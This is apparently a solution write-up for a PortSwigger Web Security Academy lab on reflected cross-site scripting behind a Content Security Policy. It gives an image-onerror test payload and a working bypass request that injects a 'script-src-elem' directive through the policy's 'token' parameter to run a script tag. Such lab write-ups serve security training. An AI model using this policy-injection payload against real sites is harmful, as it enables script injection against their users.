# Lab-30: [Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

This lab uses CSP and contains a reflected XSS vulnerability.

**Aim :-** To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function. 

**Note :-** The intended solution to this lab is only possible in Chrome.



## Solution
- Search with the following payload.
```html
<img src=1 onerror=alert(1)> 
```

- In the response the payload is rendered but alert is not showed.

- The response contains a ``` Content-Security-Policy ``` header, and the ``` report-uri ``` directive contains a parameter called ``` token ```.

- Make request by appending the following payload.
```bash
?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```